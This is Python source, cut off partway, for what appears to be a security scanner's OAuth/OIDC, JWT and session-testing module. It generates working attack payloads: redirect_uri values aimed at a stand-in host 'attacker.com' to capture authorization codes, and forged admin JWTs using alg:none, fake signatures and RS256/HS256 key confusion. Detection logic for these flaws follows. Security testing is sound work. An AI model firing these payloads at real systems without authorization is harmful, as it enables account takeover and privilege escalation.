"""
OAuth/OIDC Token Testing & Stateful Authentication Validation Collector.

Performs active security assessment of OAuth 2.0 / OpenID Connect flows, JWT token
validation, and stateful authentication/session management mechanisms using AuthenticatedHttpClient:

1. OAuth/OIDC Misconfigurations (R1):
   - redirect_uri parameter manipulation (open redirect, subdomain bypass, path traversal bypass).
   - state parameter presence and CSRF validation.
   - token and authorization code leakage via Referer headers.
   - authorization code reuse / replay.

2. Token Validation Testing (R2):
   - Signature verification bypass (alg:none, invalid/tampered signatures).
   - Key confusion attacks (RS256 vs HS256 HMAC confusion).
   - Claims validation (exp, aud, iss, nbf).
   - Token scope tampering and privilege escalation.

3. Stateful Authentication & Session Management (R3):
   - Session fixation (pre-login session ID retention post-login).
   - Insufficient session invalidation upon logout.
   - Session cookie security attributes (Secure, HttpOnly, SameSite).
   - Concurrent session state handling.

Emits high-confidence Evidence(category="oauth_misconfiguration" | "token_validation" | "session_management"),
updates mission state, and expands attack surface graph nodes with HAS_VULNERABILITY edges.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
import time
import urllib.parse
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Set, Tuple, Union

from argus.collectors.base import BaseCollector
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse
from argus.http.coordinator import MultiIdentitySessionCoordinator
from argus.models.test_identity import TestIdentity

logger = logging.getLogger(__name__)

# Common regex patterns for OAuth/OIDC and Auth routes
OAUTH_AUTH_ROUTE_PATTERNS = [
    re.compile(r"/(?:oauth(?:2)?|auth(?:n)?|oidc|connect|identity)/(?:authorize|auth|login|v1/authorize)", re.IGNORECASE),
    re.compile(r"/(?:auth/realms/[^/]+/protocol/openid-connect/auth)", re.IGNORECASE),
    re.compile(r"/(?:api(?:/v\d+)?/)?(?:oauth|oidc)/authorize", re.IGNORECASE),
]

OAUTH_TOKEN_ROUTE_PATTERNS = [
    re.compile(r"/(?:oauth(?:2)?|auth(?:n)?|oidc|connect|identity)/(?:token|access_token|v1/token)", re.IGNORECASE),
    re.compile(r"/(?:auth/realms/[^/]+/protocol/openid-connect/token)", re.IGNORECASE),
    re.compile(r"/(?:api(?:/v\d+)?/)?(?:oauth|oidc)/token", re.IGNORECASE),
]

PROTECTED_API_PATTERNS = [
    re.compile(r"/(?:api(?:/v\d+)?/)?(?:user|users|me|profile|account|admin|protected|data|dashboard|orders|settings)(?:/.*)?$", re.IGNORECASE),
    re.compile(r"/(?:oauth(?:2)?|oidc)/(?:userinfo|user_info|profile)", re.IGNORECASE),
]

LOGOUT_ROUTE_PATTERNS = [
    re.compile(r"/(?:api(?:/v\d+)?/)?(?:auth/)?(?:logout|signout|sign_out|session/destroy|logoff)", re.IGNORECASE),
]

LOGIN_ROUTE_PATTERNS = [
    re.compile(r"/(?:api(?:/v\d+)?/)?(?:auth/)?(?:login|signin|sign_in|session/create|authenticate)", re.IGNORECASE),
]

SESSION_COOKIE_NAMES_REGEX = re.compile(
    r"^(?:session|session_id|sess|sid|token|auth|jwt|connect\.sid|phpsessid|jsessionid|asp\.net_sessionid|csrftoken|access_token|refresh_token|id_token|user_session)",
    re.IGNORECASE,
)

DEFAULT_OAUTH_PROBE_ROUTES = [
    "/oauth/authorize",
    "/oauth2/authorize",
    "/auth/realms/master/protocol/openid-connect/auth",
    "/connect/authorize",
    "/api/oauth/authorize",
]

DEFAULT_TOKEN_PROBE_ROUTES = [
    "/oauth/token",
    "/oauth2/token",
    "/auth/realms/master/protocol/openid-connect/token",
    "/connect/token",
]

DEFAULT_PROTECTED_API_ROUTES = [
    "/api/user/profile",
    "/api/me",
    "/api/admin/users",
    "/oauth/userinfo",
    "/api/protected",
]

DEFAULT_LOGOUT_ROUTES = [
    "/logout",
    "/api/auth/logout",
    "/auth/logout",
    "/signout",
]


def b64url_encode(data: Union[bytes, str]) -> str:
    """Encodes bytes or string into URL-safe base64 without padding."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")


def b64url_decode(s: str) -> bytes:
    """Decodes URL-safe base64 string handling missing padding."""
    rem = len(s) % 4
    if rem > 0:
        s += "=" * (4 - rem)
    return base64.urlsafe_b64decode(s)


def create_mock_jwt(
    header: Dict[str, Any],
    payload: Dict[str, Any],
    signature: bytes = b"",
) -> str:
    """Helper to build a JWT string with arbitrary header, payload, and raw signature bytes."""
    header_json = json.dumps(header, separators=(",", ":"))
    payload_json = json.dumps(payload, separators=(",", ":"))
    header_b64 = b64url_encode(header_json)
    payload_b64 = b64url_encode(payload_json)
    sig_b64 = b64url_encode(signature) if signature else ""
    return f"{header_b64}.{payload_b64}.{sig_b64}"


def create_hs256_jwt(
    header: Dict[str, Any],
    payload: Dict[str, Any],
    secret: Union[str, bytes],
) -> str:
    """Helper to sign a JWT using HMAC-SHA256."""
    header_json = json.dumps(header, separators=(",", ":"))
    payload_json = json.dumps(payload, separators=(",", ":"))
    header_b64 = b64url_encode(header_json)
    payload_b64 = b64url_encode(payload_json)
    signing_input = f"{header_b64}.{payload_b64}".encode("utf-8")
    secret_bytes = secret.encode("utf-8") if isinstance(secret, str) else secret
    sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"


# =============================================================================
# PAYLOAD GENERATOR
# =============================================================================

class OAuthPayloadGenerator:
    """
    Generates security testing payloads for OAuth 2.0 / OIDC workflows,
    JWT token tampering, and stateful session validation.
    """

    DEFAULT_ATTACKER_DOMAIN = "attacker.com"
    DEFAULT_ATTACKER_CALLBACK = "https://attacker.com/callback"

    def __init__(self, attacker_domain: str = "attacker.com"):
        self.attacker_domain = attacker_domain
        self.attacker_callback = f"https://{attacker_domain}/callback"

    def generate_redirect_uri_payloads(
        self,
        target_url: str,
        base_url: str,
    ) -> List[Dict[str, Any]]:
        """
        Generates redirect_uri manipulation vectors:
        - External domain (open redirect)
        - Subdomain matching bypass
        - Path traversal bypass
        """
        parsed_target = urllib.parse.urlparse(target_url or base_url)
        target_host = parsed_target.hostname or "target.com"
        target_scheme = parsed_target.scheme or "https"

        payloads: List[Dict[str, Any]] = [
            # 1. Direct external open redirect
            {
                "type": "open_redirect",
                "technique": "external_domain",
                "redirect_uri": self.attacker_callback,
                "description": "Direct redirection to external attacker domain",
                "severity": "critical",
                "template_id": "oauth-open-redirect",
            },
            {
                "type": "open_redirect",
                "technique": "external_domain_http",
                "redirect_uri": f"http://{self.attacker_domain}/oauth/cb",
                "description": "Unencrypted HTTP external domain redirection",
                "severity": "high",
                "template_id": "oauth-open-redirect",
            },
            # 2. Subdomain matching bypass
            {
                "type": "subdomain_bypass",
                "technique": "suffix_subdomain",
                "redirect_uri": f"{target_scheme}://{target_host}.{self.attacker_domain}/callback",
                "description": "Unvalidated subdomain suffix bypass",
                "severity": "critical",
                "template_id": "oauth-subdomain-bypass",
            },
            {
                "type": "subdomain_bypass",
                "technique": "hyphen_prefix_subdomain",
                "redirect_uri": f"{target_scheme}://attacker-{target_host}/callback",
                "description": "Hyphenated target host prefix bypass",
                "severity": "high",
                "template_id": "oauth-subdomain-bypass",
            },
            {
                "type": "subdomain_bypass",
                "technique": "userinfo_at_bypass",
                "redirect_uri": f"{target_scheme}://{target_host}@{self.attacker_domain}/callback",
                "description": "URI userinfo '@' character parsing bypass",
                "severity": "critical",
                "template_id": "oauth-subdomain-bypass",
            },
            # 3. Path traversal bypass
            {
                "type": "path_traversal_bypass",
                "technique": "dot_dot_slash",
                "redirect_uri": f"{target_scheme}://{target_host}/oauth/callback/../../attacker",
                "description": "Path traversal via dot-dot-slash sequence",
                "severity": "high",
                "template_id": "oauth-redirect-path-traversal",
            },
            {
                "type": "path_traversal_bypass",
                "technique": "semicolon_path_traversal",
                "redirect_uri": f"{target_scheme}://{target_host}/oauth/callback/..;/attacker",
                "description": "Path traversal via semicolon matrix sequence",
                "severity": "high",
                "template_id": "oauth-redirect-path-traversal",
            },
            {
                "type": "path_traversal_bypass",
                "technique": "url_encoded_path_traversal",
                "redirect_uri": f"{target_scheme}://{target_host}/oauth/callback/..%2f..%2fattacker",
                "description": "URL-encoded path traversal sequence",
                "severity": "high",
                "template_id": "oauth-redirect-path-traversal",
            },
        ]
        return payloads

    def generate_state_payloads(self) -> List[Dict[str, Any]]:
        """
        Generates state parameter test vectors to detect missing, static,
        or predictable state parameter validation (CSRF vulnerability).
        """
        return [
            {
                "type": "missing_state",
                "state_value": None,
                "description": "Omission of state parameter",
                "severity": "medium",
                "template_id": "oauth-missing-state",
            },
            {
                "type": "static_state",
                "state_value": "1",
                "description": "Static trivial state parameter value",
                "severity": "medium",
                "template_id": "oauth-static-state",
            },
            {
                "type": "predictable_state",
                "state_value": "state_12345",
                "description": "Predictable constant state parameter",
                "severity": "medium",
                "template_id": "oauth-predictable-state",
            },
        ]

    def generate_tampered_jwt_payloads(
        self,
        base_claims: Optional[Dict[str, Any]] = None,
        rsa_public_key_pem: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """
        Generates tampered JWT tokens across R2 token validation vectors:
        - alg:none signature bypass
        - invalid/forged signature acceptance
        - RS256 vs HS256 key confusion
        - expired exp timestamp
        - invalid aud and iss claims
        - future not-before (nbf) timestamp
        - modified/escalated scopes
        """
        now = int(time.time())
        claims = dict(base_claims or {
            "sub": "admin",
            "user": "admin",
            "name": "Administrator",
            "role": "admin",
            "roles": ["admin", "superuser"],
            "admin": True,
            "scope": "openid profile email admin read write",
            "iss": "https://auth.target.com",
            "aud": "api://default",
            "iat": now - 60,
            "exp": now + 3600,
        })

        # Public key string fallback for key confusion
        pub_key = rsa_public_key_pem or (
            "-----BEGIN PUBLIC KEY-----\n"
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozVcKBu8\n"
            "r7u01U8+7cZt3qO1070A+5E...dummy_rsa_public_key_for_testing...\n"
            "-----END PUBLIC KEY-----"
        )

        # 1. alg: none token (unsigned with empty signature)
        alg_none_header = {"alg": "none", "typ": "JWT"}
        alg_none_token = create_mock_jwt(alg_none_header, claims, signature=b"")

        # 2. Case variations of alg: none
        alg_none_upper_token = create_mock_jwt({"alg": "None", "typ": "JWT"}, claims, signature=b"")
        alg_none_capital_token = create_mock_jwt({"alg": "NONE", "typ": "JWT"}, claims, signature=b"")

        # 3. Invalid signature (valid HS256/RS256 header, tampered signature)
        hs256_header = {"alg": "HS256", "typ": "JWT"}
        invalid_sig_token = f"{b64url_encode(json.dumps(hs256_header))}.{b64url_encode(json.dumps(claims))}.INVALID_FORGED_SIGNATURE_BYTES_12345"

        # 4. Key confusion (HS256 signed using RSA public key string as secret)
        key_confusion_token = create_hs256_jwt(hs256_header, claims, secret=pub_key)

        # 5. Expired token (exp in past)
        expired_claims = dict(claims)
        expired_claims["exp"] = now - 7200  # Expired 2 hours ago
        expired_token = create_hs256_jwt(hs256_header, expired_claims, secret="dummy_secret_key_12345")

        # 6. Invalid audience (aud mismatch)
        invalid_aud_claims = dict(claims)
        invalid_aud_claims["aud"] = "https://unauthorized-consumer.attacker.com"
        invalid_aud_token = create_hs256_jwt(hs256_header, invalid_aud_claims, secret="dummy_secret_key_12345")

        # 7. Invalid issuer (iss mismatch)
        invalid_iss_claims = dict(claims)
        invalid_iss_claims["iss"] = "https://evil-untrusted-issuer.com"
        invalid_iss_token = create_hs256_jwt(hs256_header, invalid_iss_claims, secret="dummy_secret_key_12345")

        # 8. Future Not-Before (nbf) token
        future_nbf_claims = dict(claims)
        future_nbf_claims["nbf"] = now + 7200  # Valid only 2 hours in the future
        future_nbf_token = create_hs256_jwt(hs256_header, future_nbf_claims, secret="dummy_secret_key_12345")

        # 9. Token Scope Escalation (tampered scope claim)
        escalated_claims = dict(claims)
        escalated_claims["scope"] = "read write admin:all superuser:manage billing:write"
        escalated_scope_token = create_hs256_jwt(hs256_header, escalated_claims, secret="dummy_secret_key_12345")

        return [
            {
                "type": "alg_none",
                "token": alg_none_token,
                "description": "JWT with alg:none signature bypass",
                "severity": "critical",
                "template_id": "jwt-alg-none-bypass",
            },
            {
                "type": "alg_none_case_mutation",
                "token": alg_none_upper_token,
                "description": "JWT with alg:None case variation",
                "severity": "critical",
                "template_id": "jwt-alg-none-bypass",
            },
            {
                "type": "alg_none_capital_mutation",
                "token": alg_none_capital_token,
                "description": "JWT with alg:NONE capital variation",
                "severity": "critical",
                "template_id": "jwt-alg-none-bypass",
            },
            {
                "type": "invalid_signature",
                "token": invalid_sig_token,
                "description": "JWT with forged / invalid signature",
                "severity": "critical",
                "template_id": "jwt-invalid-signature",
            },
            {
                "type": "key_confusion",
                "token": key_confusion_token,
                "description": "JWT signed via HS256 using public RSA key",
                "severity": "critical",
                "template_id": "jwt-key-confusion",
            },
            {
                "type": "expired_token",
                "token": expired_token,
                "description": "Expired JWT (exp claim in the past)",
                "severity": "high",
                "template_id": "jwt-expired-token",
            },
            {
                "type": "invalid_audience",
                "token": invalid_aud_token,
                "description": "JWT with unauthorized audience (aud claim)",
                "severity": "high",
                "template_id": "jwt-invalid-audience",
            },
            {
                "type": "invalid_issuer",
                "token": invalid_iss_token,
                "description": "JWT with untrusted issuer (iss claim)",
                "severity": "high",
                "template_id": "jwt-invalid-issuer",
            },
            {
                "type": "future_nbf",
                "token": future_nbf_token,
                "description": "JWT with future not-before (nbf claim)",
                "severity": "medium",
                "template_id": "jwt-future-nbf",
            },
            {
                "type": "scope_escalation",
                "token": escalated_scope_token,
                "description": "JWT with escalated scope claims for privileged operations",
                "severity": "high",
                "template_id": "jwt-scope-escalation",
            },
        ]


# =============================================================================
# ANALYZERS
# =============================================================================

class OAuthAnalyzer:
    """
    R1: Analyzes OAuth 2.0 / OIDC responses for redirect_uri manipulation,
    CSRF state parameter validation, Referer token leakage, and code reuse.
    """

    def analyze_redirect_uri_response(
        self,
        response: Optional[HttpResponse],
        payload_meta: Dict[str, Any],
        target_url: str,
    ) -> Optional[Dict[str, Any]]:
        """
        Evaluates if the authorization server accepted the manipulated redirect_uri.
        Returns finding dict if vulnerable, None otherwise.
        """
        if response is None:
            return None

        status = response.status_code
        headers = response.headers or {}
        location = headers.get("Location") or headers.get("location") or ""
        body = response.body or response.raw_body or ""
        manipulated_uri = payload_meta.get("redirect_uri", "")
        vuln_type = payload_meta.get("type", "open_redirect")
        template_id = payload_meta.get("template_id", "oauth-open-redirect")
        severity = payload_meta.get("severity", "high")

        # Extract hostname / domain of manipulated redirect URI
        parsed_manipulated = urllib.parse.urlparse(manipulated_uri)
        manipulated_host = parsed_manipulated.hostname or ""

        # 1. Check HTTP Redirect (301, 302, 303, 307, 308)
        if 300 <= status < 400 and location:
            parsed_loc = urllib.parse.urlparse(location)
            loc_host = parsed_loc.hostname or ""

            # Check if redirection location matches the external/manipulated domain
            if manipulated_host and (manipulated_host == loc_host or manipulated_host in location):
                # Verify that authorization code or access token is exposed or redirected
                snippet = f"HTTP {status} Redirect to: {location[:250]}"
                return {
                    "vulnerable": True,
                    "misconfiguration_type": vuln_type,
                    "severity": severity,
                    "confidence": 0.98,
                    "template_id": template_id,
                    "parameter": "redirect_uri",
                    "payload": manipulated_uri,
                    "location": location,
                    "status_code": status,
                    "snippet": snippet,
                    "description": f"OAuth authorization server accepted manipulated redirect_uri '{manipulated_uri}' redirecting to: {location}",
                }

            # Check path traversal reflection in location
            if vuln_type == "path_traversal_bypass" and ("attacker" in location or ".." in location):
                snippet = f"HTTP {status} Redirect with path traversal: {location[:250]}"
                return {
                    "vulnerable": True,
                    "misconfiguration_type": vuln_type,
                    "severity": severity,
                    "confidence": 0.95,
                    "template_id": template_id,
                    "parameter": "redirect_uri",
                    "payload": manipulated_uri,
                    "location": location,
                    "status_code": status,
                    "snippet": snippet,
                    "description": f"OAuth authorization server accepted path traversal redirect_uri '{manipulated_uri}' redirecting to: {location}",
                }

        # 2. Check 200 OK responses reflecting unvalidated redirect URI or meta-refresh / JS redirect
        if status == 200 and manipulated_host:
            lower_body = body.lower()
            if (f"location.href" in lower_body or "meta http-equiv=\"refresh\"" in lower_body or "window.location" in lower_body) and manipulated_host in body:
                snippet = f"Client-side script / meta-refresh redirect to {manipulated_uri} in response body"
                return {
                    "vulnerable": True,
                    "misconfiguration_type": vuln_type,
                    "severity": severity,
                    "confidence": 0.95,
                    "template_id": template_id,
                    "parameter": "redirect_uri",
                    "payload": manipulated_uri,
                    "status_code": status,
                    "snippet": snippet,
                    "description": f"OAuth server rendered client-side redirection to manipulated redirect_uri '{manipulated_uri}'",
                }

        return None

    def analyze_state_validation(
        self,
        response: Optional[HttpResponse],
        payload_meta: Dict[str, Any],
    ) -> Optional[Dict[str, Any]]:
        """
        Evaluates if authorization server allows requests without state or with trivial state.
        """
        if response is None:
            return None

        status = response.status_code
        headers = response.headers or {}
        location = headers.get("Location") or headers.get("location") or ""
        body = (response.body or response.raw_body or "").lower()
        vuln_type = payload_meta.get("type", "missing_state")
        template_id = payload_meta.get("template_id", "oauth-missing-state")
        severity = payload_meta.get("severity", "medium")

        # An error response (400 Bad Request / error=invalid_request) indicates proper validation
        if status in (400, 401, 403) or "invalid_request" in body or "error=invalid_state" in location or "missing state" in body:
            return None

        # If server issues 302 redirect containing code without state parameter, or accepts static state
        if 300 <= status < 400 and ("code=" in location or "access_token=" in location or "id_token=" in location):
            snippet = f"HTTP {status} Redirect containing auth code without CSRF state enforcement: {location[:200]}"
            return {
                "vulnerable": True,
                "misconfiguration_type": vuln_type,
                "severity": severity,
                "confidence": 0.92,
                "template_id": template_id,
                "parameter": "state",
                "status_code": status,
                "snippet": snippet,
                "description": f"OAuth authorization endpoint accepted request with {vuln_type} and generated authorization grant without CSRF state verification.",
            }

        return None

    def analyze_referer_leakage(
        self,
        response: Optional[HttpResponse],
        current_url: str,
    ) -> Optional[Dict[str, Any]]:
        """
        Detects if authorization code or access token is exposed in query/hash and leaked via Referer.
        """
        if response is None:
            return None

        headers = response.headers or {}
        referrer_policy = headers.get("Referrer-Policy") or headers.get("referrer-policy") or ""
        body = response.body or response.raw_body or ""

        # Check if URL contains code or access_token in fragment/query
        if ("code=" in current_url or "access_token=" in current_url or "token=" in current_url):
            # If page includes 3rd-party assets or external links without strict referrer policy
            external_links = re.findall(r'<a\s+[^>]*href=["\'](https?://(?!target\.com)[^"\']+)["\']', body, re.IGNORECASE)
            external_scripts = re.findall(r'<script\s+[^>]*src=["\'](https?://(?!target\.com)[^"\']+)["\']', body, re.IGNORECASE)
            
            if (external_links or external_scripts) and ("no-referrer" not in referrer_policy.lower() and "same-origin" not in referrer_policy.lower()):
                snippet = f"Authorization code/token present in URL and leaked to 3rd party assets: {referrer_policy or 'No Referrer-Policy header'}"
                return {
                    "vulnerable": True,
                    "misconfiguration_type": "referer_token_leakage",
                    "severity": "high",
                    "confidence": 0.90,
                    "template_id": "oauth-token-leakage-referer",
                    "parameter": "Referer",
                    "status_code": response.status_code,
                    "snippet": snippet,
                    "description": "OAuth token or authorization code exposed in URL and susceptible to leakage via Referer header to external origins.",
                }

        return None

    def analyze_code_reuse(
        self,
        first_response: Optional[HttpResponse],
        second_response: Optional[HttpResponse],
    ) -> Optional[Dict[str, Any]]:
        """
        Detects if authorization code can be replayed / exchanged for tokens multiple times.
        """
        if first_response is None or second_response is None:
            return None

        # First request must have succeeded
        if first_response.status_code not in (200, 201):
            return None

        # If second exchange also succeeds with 200 OK and contains an access_token, code reuse is confirmed
        second_body = second_response.body or second_response.raw_body or ""
        if second_response.status_code in (200, 201) and ("access_token" in second_body or "token_type" in second_body):
            snippet = f"Second authorization code exchange returned HTTP {second_response.status_code} with token: {second_body[:200]}"
            return {
                "vulnerable": True,
                "misconfiguration_type": "authorization_code_reuse",
                "severity": "critical",
                "confidence": 0.98,
                "template_id": "oauth-code-reuse",
                "parameter": "code",
                "status_code": second_response.status_code,
                "snippet": snippet,
                "description": "OAuth authorization code was exchanged multiple times without one-time-use invalidation.",
            }

        return None


class TokenValidationAnalyzer:
    """
    R2: Analyzes OIDC/JWT token security properties:
    - Signature verification (alg:none bypass, invalid signature acceptance)
    - Key confusion attacks (RS256 vs HS256)
    - Claims validation (exp, aud, iss, nbf)
    - Token scope escalation
    """

    def analyze_alg_none(
        self,
        response: Optional[HttpResponse],
        baseline_response: Optional[HttpResponse] = None,
    ) -> Optional[Dict[str, Any]]:
        """
        Detects acceptance of unsigned JWT with alg:none.
        """
        if response is None:
            return None

        status = response.status_code
        body = response.body or response.raw_body or ""

        # Endpoint returning 200 OK with authenticated data indicates vulnerability
        if 200 <= status < 300:
            # Check for authentic/success indicators
            if any(k in body.lower() for k in ["admin", "user", "profile", "success", "secret", "authorized", "role", "email", "superuser", "ok", "authenticated"]):
                snippet = f"HTTP {status} OK accepting unsigned alg:none JWT. Response: {body[:250]}"
                return {
                    "vulnerable": True,
                    "misconfiguration_type": "alg_none_bypass",
                    "severity": "critical",
                    "confidence": 0.98,
                    "template_id": "jwt-alg-none-bypass",
                    "parameter": "Authorization",
                    "status_code": status,
                    "snippet": snippet,
                    "description": "Protected endpoint accepted an unsigned JWT token with alg:none header and granted privileged access without signature verification.",
                }

        return None

    def analyze_signature_bypass(
        self,
        response: Optional[HttpResponse],
        baseline_response: Optional[HttpResponse] = None,
    ) -> Optional[Dict[str, Any]]:
        """
        Detects acceptance of JWT with invalid / forged signature.
        """
        if response is None:
            return None

        status = response.status_code
        body = response.body or response.raw_body or ""

        if 200 <= status < 300:
            if any(k in body.lower() for k in ["admin", "user", "profile", "success", "secret", "authorized", "role", "email", "superuser", "ok", "authenticated"]):
                snippet = f"HTTP {status} OK accepting forged/invalid JWT signature. Response: {body[:250]}"
                return {
                    "vulnerable": True,
                    "misconfiguration_type": "invalid_signature_acceptance",
                    "severity": "critical",
                    "confidence": 0.98,
                    "template_id": "jwt-invalid-signature",
                    "parameter": "Authorization",
                    "status_code": status,
                    "snippet": snippet,
                    "description": "Protected endpoint accepted a JWT token with a forged signature without validating cryptographic authenticity.",
                }

        return None

    def analyze_key_confusion(
        self,
        response: Optional[HttpResponse],
        baseline_response: Optional[HttpResponse] = None,
    ) -> Optional[Dict[str, Any]]:
        """
        Detects acceptance of HMAC-SHA256 token signed using RSA public key (key confusion).
        """
        if response is None:
            return None

        status = response.status_code
        body = response.body or response.raw_body or ""

        if 200 <= status < 300:
            if any(k in body.lower() for k in ["admin", "user", "profile", "success", "secret", "authorized", "role", "email", "superuser", "ok", "authenticated"]):
                snippet = f"HTTP {status} OK accepting HS256 token signed with RSA public key. Response: {body[:250]}"
                return {
                    "vulnerable": True,
                    "misconfiguration_type": "key_confusion",
                    "severity": "critical",
                    "confidence": 0.95,
                    "template_id": "jwt-key-confusion",
                    "parameter": "Authorization",
                    "status_code": status,
                    "snippet": snippet,
                    "description": "Endpoint vulnerable to JWT algorithm key confusion (RS256 vs HS256): accepted HMAC-SHA256 signature using the public RSA key.",
                }

        return None

    def analyze_claims_validation(
        self,
        response: Optional[HttpResponse],
        claim_type: str,
        baseline_response: Optional[HttpResponse] = None,
    ) -> Optional[Dict[str, Any]]:
        """
        Detects missing or improper validation of claims:
        - exp: expired token accepted
        - aud: unauthorized audience accepted
        - iss: unauthorized issuer accepted
        - nbf: future not-before token accepted
        """
        if response is None:
            return None

        status = response.status_code
        body = response.body or response.raw_body or ""

        if 200 <= status < 300:
            if any(k in body.lower() for k in ["admin", "user", "profile", "success", "secret", "authorized", "role", "email", "superuser", "ok", "authenticated"]):
                severity_map = {
                    "exp": "high",
                    "aud": "high",
                    "iss": "high",
                    "nbf": "medium",
                }
                sev = severity_map.get(claim_type, "high")
                snippet = f"HTTP {status} OK accepting token with invalid '{claim_type}' claim. Response: {body[:250]}"
                return {
                    "vulnerable": True,
                    "misconfiguration_type": f"improper_claims_{claim_type}",
                    "severity": sev,
                    "confidence": 0.92,
                    "template_id": f"jwt-claim-{claim_type}",
                    "parameter": "Authorization",
                    "claim": claim_type,
                    "status_code": status,
                    "snippet": snippet,
                    "description": f"Endpoint failed to enforce JWT '{claim_type}' claim validation and accepted invalid/expired token.",
                }

        return None

    def analyze_scope_escalation(
        self,
        response: Optional[HttpResponse],
        baseline_response: Optional[HttpResponse] = None,
    ) -> Optional[Dict[str, Any]]:
        """
        Detects acceptance of tokens with modified or escalated scopes for privileged operations.
        """
        if response is None:
            return None

        status = response.status_code
        body = response.body or response.raw_body or ""

        if 200 <= status < 300:
            if any(k in body.lower() for k in ["admin", "superuser", "privileged", "manage", "billing", "all", "success", "ok"]):
                snippet = f"HTTP {status} OK accepting modified scope claims. Response: {body[:250]}"
                return {
                    "vulnerable": True,
                    "misconfiguration_type": "scope_escalation",
                    "severity": "high",
                    "confidence": 0.90,
                    "template_id": "jwt-scope-escalation",
                    "parameter": "Authorization",
                    "status_code": status,
                    "snippet": snippet,
                    "description": "Endpoint accepted tampered or escalated JWT scope claims without server-side permission verification.",
                }

        return None


class SessionSecurityAnalyzer:
    """
    R3: Analyzes stateful authentication workflows:
    - Session fixation (pre-login session ID retention)
    - Insufficient session invalidation on logout
    - Cookie security flags (Secure, HttpOnly, SameSite)
    - Concurrent session handling
    """

    def analyze_cookie_security(
        self,
        set_cookie_headers: List[str],
        url: str,
    ) -> List[Dict[str, Any]]:
        """
        Validates presence and correctness of Secure, HttpOnly, and SameSite flags
        on Set-Cookie response headers.
        """
        findings: List[Dict[str, Any]] = []
        is_https = url.startswith("https://")

        for header_value in set_cookie_headers:
            if not header_value:
                continue

            # Parse cookie name and attributes
            parts = [p.strip() for p in header_value.split(";") if p.strip()]
            if not parts:
                continue

            cookie_pair = parts[0]
            cookie_name = cookie_pair.split("=")[0].strip() if "=" in cookie_pair else cookie_pair
            
            # Focus on session-relevant cookies or cookies on auth routes
            is_session_cookie = bool(SESSION_COOKIE_NAMES_REGEX.search(cookie_name))

            attr_map: Dict[str, Optional[str]] = {}
            for attr in parts[1:]:
                if "=" in attr:
                    k, v = attr.split("=", 1)
                    attr_map[k.strip().lower()] = v.strip()
                else:
                    attr_map[attr.strip().lower()] = None

            missing_flags: List[str] = []

            # 1. Secure flag
            if "secure" not in attr_map:
                missing_flags.append("Secure")

            # 2. HttpOnly flag (critical for session cookies)
            if "httponly" not in attr_map:
                missing_flags.append("HttpOnly")

            # 3. SameSite flag
            samesite_val = attr_map.get("samesite")
            if samesite_val is None and "samesite" not in attr_map:
                missing_flags.append("SameSite")
            elif samesite_val and samesite_val.lower() == "none" and "secure" not in attr_map:
                missing_flags.append("SameSite=None without Secure")

            if missing_flags:
                sev = "medium" if is_session_cookie else "low"
                if "HttpOnly" in missing_flags and "Secure" in missing_flags:
                    sev = "medium"

                snippet = f"Set-Cookie: {header_value[:200]} (Missing: {', '.join(missing_flags)})"
                findings.append({
                    "vulnerable": True,
                    "misconfiguration_type": "insecure_cookie_attributes",
                    "severity": sev,
                    "confidence": 0.95,
                    "template_id": "session-insecure-cookie",
                    "parameter": cookie_name,
                    "cookie_name": cookie_name,
                    "missing_flags": missing_flags,
                    "raw_header": header_value,
                    "snippet": snippet,
                    "description": f"Session cookie '{cookie_name}' lacks security attributes: {', '.join(missing_flags)}.",
                })

        return findings

    def analyze_session_fixation(
        self,
        pre_auth_cookie: str,
        post_auth_cookie: str,
        url: str = "",
    ) -> Optional[Dict[str, Any]]:
        """
        Detects session fixation: pre-authentication session ID maintained post-login.
        """
        if not pre_auth_cookie or not post_auth_cookie:
            return None

        if pre_auth_cookie == post_auth_cookie:
            snippet = f"Session cookie value retained unchanged across authentication boundary: {pre_auth_cookie[:40]}..."
            return {
                "vulnerable": True,
                "misconfiguration_type": "session_fixation",
                "severity": "high",
                "confidence": 0.95,
                "template_id": "session-fixation",
                "parameter": "Cookie",
                "snippet": snippet,
                "description": "Session Fixation vulnerability: pre-authentication session identifier was retained after successful user login instead of being regenerated.",
            }

        return None

    def analyze_logout_invalidation(
        self,
        post_logout_protected_response: Optional[HttpResponse],
    ) -> Optional[Dict[str, Any]]:
        """
        Detects insufficient session invalidation: session remains active after logout.
        """
        if post_logout_protected_response is None:
            return None

        status = post_logout_protected_response.status_code
        body = post_logout_protected_response.body or post_logout_protected_response.raw_body or ""

        # If protected endpoint returns 200 OK after logout with authenticated content, session was not invalidated
        if 200 <= status < 300:
            if any(k in body.lower() for k in ["admin", "user", "profile", "success", "secret", "authorized", "role", "email", "superuser", "ok"]):
                snippet = f"HTTP {status} OK accessing protected endpoint using session cookie/token after logout request: {body[:200]}"
                return {
                    "vulnerable": True,
                    "misconfiguration_type": "insufficient_logout_invalidation",
                    "severity": "medium",
                    "confidence": 0.92,
                    "template_id": "session-logout-invalidation",
                    "parameter": "session",
                    "status_code": status,
                    "snippet": snippet,
                    "description": "Insufficient session invalidation: session identifier or token remained valid to access protected resources after a logout action.",
                }

        return None


# =============================================================================
# OAUTH COLLECTOR
# =============================================================================

class OAuthCollector(BaseCollector):
    """
    Argus Collector for OAuth 2.0 / OpenID Connect token testing and stateful auth validation.
    Orchestrates R1, R2, and R3 security checks across discovered endpoints.
    """

    def __init__(
        self,
        http_client: Optional[Any] = None,
        timeout: float = 10.0,
        payload_generator: Optional[OAuthPayloadGenerator] = None,
        analyzer: Optional[Any] = None,
    ):
        self.custom_http_client = http_client
        self.timeout = timeout
        self.generator = payload_generator or OAuthPayloadGenerator()
        self.oauth_analyzer = analyzer if isinstance(analyzer, OAuthAnalyzer) else OAuthAnalyzer()
        self.token_analyzer = analyzer if isinstance(analyzer, TokenValidationAnalyzer) else TokenValidationAnalyzer()
        self.session_analyzer = analyzer if isinstance(analyzer, SessionSecurityAnalyzer) else SessionSecurityAnalyzer()

    def execute(self, mission: Any) -> List[Evidence]:
